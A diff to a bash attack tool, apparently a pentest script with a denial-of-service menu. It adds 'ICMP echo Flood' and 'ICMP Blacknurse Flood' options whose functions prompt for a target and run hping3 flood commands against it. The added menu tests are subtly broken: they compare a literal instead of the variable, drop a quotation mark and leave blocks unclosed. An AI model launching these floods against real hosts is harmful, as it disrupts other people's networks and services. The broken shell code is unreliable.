@@ -271,8 +271,14 @@ done
 dosmenu()
 {
 #display a menu for the DOS module using bash select
-		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
+		dosmenu=("ICMP echo Flood" "ICMP Blacknurse Flood" "TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "TCP XMAS Flood" "UDP Flood" "SSL DOS" "Slowloris" "IPsec DOS" "Distraction Scan" "DNS NXDOMAIN Flood" "Go back")
 	select dosopt in "${dosmenu[@]}"; do
+#ICMP echo Flood
+	if [ "dosopt" = "ICMP echo Flood" ]; then
+		icmpflood
+#ICMP Blacknurse Flood
+	if [ "dosopt" = ICMP Blacknurse Flood" ]; then
+		blacknurse
 #TCP SYN Flood DOS
  	if [ "$dosopt" = "TCP SYN Flood" ]; then
 		synflood
@@ -314,6 +320,32 @@ dosmenu()
 }
 ##END DOSMENU##
 ###############
+
+###################
+##START ICMPFLOOD##
+icmpflood()
+{	echo "Preparing to launch ICMP Echo Flood using hping3"
+	echo "Enter target IP/hostname:"
+#need a target IP/hostname
+	read -i $TARGET -e TARGET
+	echo "Launching ICMP Echo Flood against $TARGET" && sleep 1
+	sudo hping3 -1 --flood $TARGET
+}
+##END ICMPFLOOD##
+#################
+
+####################
+##START BLACKNURSE##
+blacknurse()
+{	echo "Preparing to launch ICMP Blacknurse attack using hping3"
+	echo "Enter target IP/hostname:"
+#need a target IP/hostname
+	read -i $TARGET -e TARGET
+	echo "Launching ICMP Blacknurse against $TARGET" && sleep 1
+	sudo hping3 -1 -C 3 -K 3 --flood $TARGET
+}
+##END BLACKNURSE##
+##################
 
 #####################
 ##START TCPSYNFLOOD##
